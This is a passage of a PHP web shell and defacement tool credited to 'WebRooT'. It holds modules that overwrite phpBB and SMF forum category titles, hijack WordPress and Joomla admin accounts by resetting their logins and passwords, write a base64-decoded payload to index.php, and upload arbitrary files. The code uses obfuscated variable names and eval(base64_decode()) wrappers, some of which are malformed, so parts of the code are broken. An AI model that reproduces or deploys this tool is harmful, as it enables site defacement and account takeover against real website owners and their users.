$phpbb_dbh = $_POST['phpbbdbh']; 
$phpbb_dbu = $_POST['phpbbdbu']; 
$phpbb_dbn = $_POST['phpbbdbn']; 
$phpbb_dbp = $_POST['phpbbdbp']; 
$phpbb_kat = $_POST['phpbbkat']; 
$kategoriid=$_POST['katid']; 

if (!empty($phpbb_dbh) && !empty($phpbb_dbu) && !empty($phpbb_dbn) && !empty($phpbb_kat)) 
{ 
mysql_connect($phpbb_dbh,$phpbb_dbu,$phpbb_dbp) or die(mysql_error()); 
mysql_select_db($phpbb_dbn) or die(mysql_error()); 


$loli10 = "UPDATE phpbb_categories  SET cat_title='".$phpbb_kat."' WHERE cat_id='".$kategoriid."'"; 

$result = mysql_query($loli10) or die (mysql_error()); 

echo "<script>alert('PhpBB Hacked');</script>"; 
} 
//SmfHACK 
if (isset($_POST['smf'])) 
{ 
echo "<center><table border=0 width='100%'> 
<tr><td> 
<center><font face='Arial' color='#000000'>== SMF Indexer ==</font></center> 
    <center><form method=POST action=''><font face='Arial' color='#000000'>Mysql Host</font><br><input type=text name=smfdbh value=localhost size='50' style='font-size: 8pt; color: #000000; font-family: Tahoma; border: 1px solid #666666; background-color: #FFFFFF'><br> 
          <font face='Arial' color='#000000'>DbKullanici<br></font><input type=text name=smfdbu size='50' style='font-size: 8pt; color: #000000; font-family: Tahoma; border: 1px solid #666666; background-color: #FFFFFF'><br> 
          <font face='Arial' color='#000000'>Dbadi<br></font><input type=text name=smfdbn size='50' style='font-size: 8pt; color: #000000; font-family: Tahoma; border: 1px solid #666666; background-color: #FFFFFF'><br> 
          <font face='Arial' color='#000000'>Dbsifre<br></font><input type=password name=smfdbp size='50' style='font-size: 8pt; color: #000000; font-family: Tahoma; border: 1px solid #666666; background-color: #FFFFFF'><br> 
                    <font face='Arial' color='#000000'>Yazi Yada KOD<br></font><input type=text name=smf_index size='100' style='font-size: 8pt; color: #000000; font-family: Tahoma; border: 1px solid #666666; background-color: #FFFFFF'><br> 
                    <font face='Arial' color='#000000'>Degisecek KATEGORI ID si <br></font><input type=text name=katid size='100' style='font-size: 8pt; color: #000000; font-family: Tahoma; border: 1px solid #666666; background-color: #FFFFFF'><br> 

          <input type=submit value='Kay Gitsin!' ></form></center></td></tr></table></center>"; 
die(); 
} 
$smf_dbh = $_POST['smfdbh']; 
$smf_dbu = $_POST['smfdbu']; 
$smf_dbn = $_POST['smfdbn']; 
$smf_dbp = $_POST['smfdbp']; 
$smf_index = $_POST['smf_index']; 
$smf_katid=$_POST['katid']; 

if (!empty($smf_dbh) && !empty($smf_dbu) && !empty($smf_dbn) && !empty($smf_index)) 
{ 
mysql_connect($smf_dbh,$smf_dbu,$smf_dbp) or die(mysql_error()); 
mysql_select_db($smf_dbn) or die(mysql_error()); 
$prefix="smf_"; 
$loli12 = "UPDATE ".$prefix."categories SET name='".$smf_index."' WHERE ID_CAT='".$smf_katid."'"; 

$result = mysql_query($loli12) or die (mysql_error()); 

echo "<script>alert('smf Hacked');</script>"; 
} 


//Alt taraf 
echo " 


<br><table width='100%' height='1' border='1' cellPadding=5 cellSpacing=0 borderColorDark=#666666 id='table1' style='BORDER-COLLAPSE: collapse'> 
<tr> 
<td width='25%' height='1' valign='top' style='font-family: verdana; color: #000000; font-size: 11px'> 
  <center><p><strong><h2>Edited By WebRooT</strong></p></h2></center>
  <center><p><strong>..:: indexer V2.0 ::..</strong></p></center>
<p><strong></strong><br> 
</p></td> 
</tr></table>"; 



// Kod bitisi 
?> ';
$IIIIIIIllIlI = fopen('index.php','w+');
$IIIIIIIllIll = fwrite ($IIIIIIIllIlI ,base64_decode($IIIIIIIlllII));
fclose($IIIIIIIllIlI);
echo '<iframe src=indexer/index.php width=100% height=620px frameborder=0></iframe> ';
break;
case 'wp':
echo '<img src=http://img810.imageshack.us/img810/8043/webr00t12.png>';
eval(base64_decode('if(empty($_POST['pwd'])){
echo "<FORM method=\"POST\">
host : <INPUT size=\"15\" value=\"localhost\" name=\"localhost\" type=\"text\">
database : <INPUT size=\"15\" value=\"wp-\" name=\"database\" type=\"text\"><br>
username : <INPUT size=\"15\" value=\"wp-\" name=\"username\" type=\"text\">
password : <INPUT size=\"15\" value=\"**\" name=\"password\" type=\"password\"><br>
  <br>
Set A New username 4 Login : <INPUT name=\"admin\" size=\"15\" value=\"admin\"><br>
Set A New password 4 Login : <INPUT name=\"pwd\" size=\"15\" value=\"123456\"><br>

<INPUT value=\"change\" name=\"send\" type=\"submit\">
</FORM>";
}else{
$localhost = $_POST['localhost'];
$database  = $_POST['database'];
$username  = $_POST['username'];
$password  = $_POST['password'];
$pwd   = $_POST['pwd'];
$admin = $_POST['admin'];


 @mysql_connect($localhost,$username,$password) or die(mysql_error());
 @mysql_select_db($database) or die(mysql_error());

$hash = crypt($pwd);
$a4s=@mysql_query("UPDATE wp_users SET user_login ='".$admin."' WHERE ID = 1") or die(mysql_error());
$a4s=@mysql_query("UPDATE wp_users SET user_pass ='".$hash."' WHERE ID = 1") or die(mysql_error());
$a4s=@mysql_query("UPDATE wp_users SET user_login ='".$admin."' WHERE ID = 2") or die(mysql_error());
$a4s=@mysql_query("UPDATE wp_users SET user_pass ='".$hash."' WHERE ID = 2") or die(mysql_error());
$a4s=@mysql_query("UPDATE wp_users SET user_login ='".$admin."' WHERE ID = 3") or die(mysql_error());
$a4s=@mysql_query("UPDATE wp_users SET user_pass ='".$hash."' WHERE ID = 3") or die(mysql_error());
$a4s=@mysql_query("UPDATE wp_users SET user_email ='".$SQL."' WHERE ID = 1") or die(mysql_error());


if($a4s){
echo "<b> Success :Now Use A New User And Pass To login In The Admin Panel</b> ";
}

}
break;
case 'joom':
echo '<img src=http://img810.imageshack.us/img810/8043/webr00t12.png>';
eval(base64_decode('if(empty($_POST['pwd'])){
echo "<FORM method=\"POST\">
host : <INPUT size=\"15\" value=\"localhost\" name=\"localhost\" type=\"text\">
database : <INPUT size=\"15\" value=\"database\" name=\"database\" type=\"text\"><br>
username : <INPUT size=\"15\" value=\"db_user\" name=\"username\" type=\"text\">
password : <INPUT size=\"15\" value=\"**\" name=\"password\" type=\"password\"><br>
  <br>
Set A New username For Login : <INPUT name=\"admin\" size=\"15\" value=\"admin\"><br>
Don`t Change it Password is : 123456: <INPUT name=\"pwd\" size=\"15\" value=\"e10adc3949ba59abbe56e057f20f883e\"><br>

<INPUT value=\"change\" name=\"send\" type=\"submit\">
</FORM>";
}else{
$localhost = $_POST['localhost'];
$database  = $_POST['database'];
$username  = $_POST['username'];
$password  = $_POST['password'];
$pwd   = $_POST['pwd'];
$admin = $_POST['admin'];
@mysql_connect($localhost,$username,$password) or die(mysql_error());
@mysql_select_db($database) or die(mysql_error());
$hash = crypt($pwd);
$SQL=@mysql_query("UPDATE jos_users SET username ='".$admin."' WHERE ID = 62") or die(mysql_error());
$SQL=@mysql_query("UPDATE jos_users SET password ='".$pwd."' WHERE ID = 62") or die(mysql_error());
$SQL=@mysql_query("UPDATE jos_users SET username ='".$admin."' WHERE ID = 63") or die(mysql_error());
$SQL=@mysql_query("UPDATE jos_users SET password ='".$pwd."' WHERE ID = 63") or die(mysql_error());
$SQL=@mysql_query("UPDATE jos_users SET username ='".$admin."' WHERE ID = 64") or die(mysql_error());
$SQL=@mysql_query("UPDATE jos_users SET password ='".$pwd."' WHERE ID = 64") or die(mysql_error());
$SQL=@mysql_query("UPDATE jos_users SET username ='".$admin."' WHERE ID = 65") or die(mysql_error());
$SQL=@mysql_query("UPDATE jos_users SET password ='".$pwd."' WHERE ID = 65") or die(mysql_error());
if($SQL){
echo "<b>Success :Now Use A New User And Password - (123456)";
}
}
break;
default:
header("Location: $IIIIIIIIIlll");
}
}else
{
echo '<img src=http://img810.imageshack.us/img810/8043/webr00t12.png>';
echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
echo '<input type="file" name="file" value="Choose file" size="60" ><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
if( $_POST['_upl'] == 'Upload') {
if(@copy($_FILES['file']['tmp_name'],$_FILES['file']['name'])) {echo '<br /><br /><b>Upload Basarili..!<br><br>';}
else {echo '<br /><br />Upload Basarisiz..!<br><br>';}
}
echo '
<br /><br /><div class="fot">Coded by WebRooT
<br /><br />
<a target="_blank" title="webroot,webr00t,defacer,webr00t.info,WebRooT" href="http://webr00t.info/">OfficiaL Web Paqe</a></div> ';
};

?>
